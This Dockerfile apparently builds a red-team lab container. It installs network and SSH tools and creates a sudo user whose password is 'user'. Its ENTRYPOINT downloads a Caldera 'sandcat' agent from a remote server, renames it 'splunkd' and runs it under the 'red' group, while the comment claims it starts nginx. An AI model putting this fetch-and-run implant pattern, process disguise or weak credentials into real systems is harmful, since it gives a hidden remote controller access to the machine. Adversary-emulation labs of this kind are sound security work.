FROM ubuntu:latest

# Install necessary packages
RUN apt-get update && apt-get install -y \
    iputils-ping \
    traceroute \
    net-tools \
    curl \
    vim \
    sudo \
    ssh \
    sshpass \
    && apt-get clean

# Create a new user 'user' and set up their environment
RUN useradd -m user && echo "user:user" | chpasswd && usermod -aG sudo user

# Copy custom bashrc for root and the new user
COPY bashrc /root/.bashrc
COPY bashrc /home/user/.bashrc
RUN chown user:user /home/user/.bashrc

# Start agent and nginx
ENTRYPOINT server="http://$SERVER";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v